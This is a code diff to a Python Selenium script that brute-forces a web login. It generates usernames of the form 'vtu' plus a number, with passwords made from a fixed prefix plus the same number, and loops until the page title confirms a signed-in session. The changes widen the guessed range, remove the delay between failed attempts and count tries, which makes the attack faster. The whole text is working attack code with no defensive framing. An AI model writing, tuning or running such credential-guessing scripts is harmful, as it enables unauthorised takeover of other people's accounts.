@@ -10,29 +10,31 @@ def logbrute(user,passw):
         driver.find_element(By.ID,"username").send_keys(user)
         driver.find_element(By.ID,"password").send_keys(passw)
         driver.find_element(By.ID,"loginbutton").click()
-        statusmessage =driver.find_element(By.ID,"statusmessage").text
+        time.sleep(0.1)
+        statusmessage =driver.title
         return statusmessage
 def randuser():
     lis = []
-    randnum =random.randrange(19700,22000)
+    randnum =random.randrange(19000,22000)
     user = "vtu"+str(randnum)
     passw = "9991072010"+str(randnum)
     lis =[user,passw]
     return lis
-
+tries =1
 while True:
     lis = randuser()
     user = lis[0]
     passw=lis[1]
     statusmessage=logbrute(user,passw)
-    tittle = driver.title
     text = "You are signed in as "+lis[0]
-    if tittle == text:
-        print(tittle)
+    if statusmessage == text:
+        print(statusmessage)
+        print("connected at {} try".format(tries))
         break
     else:
-        time.sleep(3)
-        print(tittle,text)
+        pass
+    tries+=1
+
         
     
     
